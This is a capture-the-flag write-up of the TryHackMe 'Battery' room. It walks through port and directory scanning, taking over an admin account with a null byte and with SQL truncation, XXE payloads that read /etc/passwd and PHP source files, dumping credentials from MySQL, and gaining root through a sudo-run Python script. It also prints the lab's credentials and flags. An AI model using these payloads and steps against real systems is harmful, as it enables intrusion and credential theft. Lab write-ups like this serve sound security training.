> Battery

**export IP=10.10.83.222**

# Nmap

sudo nmap -sC -sV -T4 -Pn -p- -vv -oN nmap/initial $IP

```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

# Gobuster

sudo gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/initial -x txt,php,sql,bak,zip,js,bin,cgi  

```
/register.php (Status: 200)
/admin.php (Status: 200)
/scripts (Status: 301)
/forms.php (Status: 200)
/report (Status: 200)
/logout.php (Status: 302)
/dashboard.php (Status: 302)
/acc.php (Status: 200)
/with.php (Status: 302)
```

And accessing `/report` directory we are given an ELF file. And looking at it through radare2 we come to know we have a guest account. `guest`:`guest`. With the credentials we can check the users or we can just strings and look at it too.

In the website, we are logged out often as we are not in as admin. We got a bunch of usernames from the binary. We can actually enter as admin in 2 ways!

# Method 1

Place a null charachter i.e) `%00` after the admin account. By looking at the users we can know which is the admin account. 

# Method 2

While looking at `admin.php` and `register.php` we can find a differnce between them. It is the maxlength. This attackis known as SQL Truncation attack and here we trick the maxlength by adding extra characters and thus looking like a new account. We have to change the maxlength in Inspector tab to 14. And register user as `admin@bank.a a`. Here the ` a` is the trickster and we are sucessfully in as admin.

When trying to access command we are logged out after some time saying `RCE detected`. And in the response we got XML. So, it may be XXE. And after looking at Payload All the Things we have a response!

## Payload

```
<!DOCTYPE replace [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> 
]>
```

We can get both acc.php and admin.php 

```
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/admin.php"> 
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/acc.php"> 
```

And looking at acc.php, we got cyber's password. `cyber`:`super#secure&password!`. And we can SSH and obtain the 1'st flag!

# Flag 1

```
THM{6f7e4dd134e19af144c88e4fe46c67ea}
```

# Privilege Escalation

sudo -l

```
User cyber may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py
```

When we run this, we get 

sudo /usr/bin/python3 /home/cyber/run.py

`Hey Cyber I have tested all the main components of our web server but something unusal happened from my end!`

We also got admin.php ancd checking it we got mysql credentials `root`:`idkpass`

```
mysql -u root -p
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| details            |
| menagerie          |
| mysql              |
| performance_schema |
+--------------------+
use details;
show tables;
+-------------------+
| Tables_in_details |
+-------------------+
| users             |
+-------------------+
select * from users;
+--------------+--------------------+-----+--------+-----------+
| username     | password           | cno | amount | bank_name |
+--------------+--------------------+-----+--------+-----------+
| cyber        | cyber              |  14 |      0 | ABC       |
| admin@bank.a | I_know_my_password |  15 |  49000 | ABC       |
| admin        | pass               |  17 |      0 | ABC       |
| check        | check              |  19 |      0 | ABC       |
| test         | test               |  20 |      0 | ABC       |
| admin0@bank. | admin              |  21 |      0 | ABC       |
| admin@bank.a | admin              |  22 |  49000 | ABC       |
+--------------+--------------------+-----+--------+-----------+
```

We got all the credentials. 

Let's move the run.py and make one woth a reverse shell in it and no we are in as root!

# Flag2.txt

```
THM{20c1d18791a246001f5df7867d4e6bf5}
```

# root.txt

```
THM{db12b4451d5e70e2a177880ecfe3428d}
```